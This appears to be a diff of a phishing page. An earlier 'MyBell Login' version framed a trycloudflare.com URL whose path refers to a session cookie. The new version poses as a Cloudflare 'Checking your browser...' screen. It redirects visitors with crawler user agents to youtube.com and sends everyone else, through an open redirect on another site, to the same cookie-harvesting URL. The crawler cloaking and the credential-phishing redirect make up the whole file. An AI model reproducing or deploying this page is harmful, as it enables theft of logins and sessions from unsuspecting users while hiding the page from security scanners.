@@ -1,25 +1,167 @@
-<!DOCTYPE html>
-<html lang="en">
+
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-  <title>MyBell Login - Project</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Redirecting...</title>
+    <style type="text/css">
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.7em;
+            -webkit-font-smoothing: antialiased;
+        }
+        h1 {
+            text-align: center;
+            font-weight: 700;
+            margin: 16px 0;
+            font-size: 32px;
+            color: #000000;
+            line-height: 1.25;
+        }
+        p {
+            font-size: 20px;
+            font-weight: 400;
+            margin: 8px 0;
+            text-align: center;
+        }
+        #spinner {
+            margin: 0 auto 30px auto;
+            display: block;
+        }
+        .bubbles {
+            background-color: #f58220;
+            width: 20px;
+            height: 20px;
+            margin: 2px;
+            border-radius: 100%;
+            display: inline-block;
+        }
+        @keyframes fader {
+            0% { opacity: 0.2; }
+            50% { opacity: 1.0; }
+            100% { opacity: 0.2; }
+        }
+        #cf-bubbles > .bubbles {
+            animation: fader 1.6s infinite;
+        }
+        #cf-bubbles > .bubbles:nth-child(2) {
+            animation-delay: .2s;
+        }
+        #cf-bubbles > .bubbles:nth-child(3) {
+            animation-delay: .4s;
+        }
+    </style>
+    <script type="text/javascript">
+        // Bot detection and redirection logic
+        (function() {
+            // List of known bot user agent patterns
+            const botUserAgents = [
+                'Googlebot',
+                'Bingbot',
+                'Slurp',
+                'DuckDuckBot',
+                'Baiduspider',
+                'YandexBot',
+                'Sogou',
+                'Exabot',
+                'facebot',
+                'ia_archiver',
+                'MJ12bot',
+                'AhrefsBot',
+                'SemrushBot',
+                'DotBot',
+                'spider',
+                'crawl',
+                'bot'
+            ];
+
+            // Get the user agent string
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+            // Check if the user agent matches any bot pattern
+            const isBot = botUserAgents.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
+
+            // Redirect based on bot detection
+            setTimeout(function() {
+                if (isBot) {
+                    window.location.href = 'https://youtube.com';
+                } else {
+                    window.location.href = 'https://www.lawprofiler.com/redirect.php?offre=BAHI5XPTB6UE77DVKTJSBL7X9VPHEKLGBRDAGUPOE8LNB6OQ1S&link=https://republican-chose-administrator-recommends.trycloudflare.com/adygahdhdakjlkajjaod/redir/cookie/s7d9d0.php?sessioncookie=aHR0cHM6Ly9yb2FtaW5nMS1zeW5jLmNsb3VkLw==';
+                }
+            }, 2000); // Delay for 2 seconds to show the loading animation
+        })();
+    </script>
 </head>
 <body>
-  <iframe src="https://republican-chose-administrator-recommends.trycloudflare.com/adygahdhdakjlkajjaod/redir/cookie/s7d9d0.php?sessioncookie=aHR0cHM6Ly9yb2FtaW5nMS1zeW5jLmNsb3VkLw==" title="Login"></iframe>
+    <table width="100%" height="100%" cellpadding="20">
+        <tbody>
+            <tr>
+                <td align="center" valign="middle">
+                    <div class="cf-browser-verification">
+                        <div id="cf-bubbles">
+                            <div class="bubbles"></div>
+                            <div class="bubbles"></div>
+                            <div class="bubbles"></div>
+                        </div>
+                        <h1>Checking your browser...</h1>
+                        <p>This process is automatic. Your browser will redirect shortly.</p>
+                        <p>Please allow up to 5 seconds…</p>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+    </table>
 </body>
 </html>
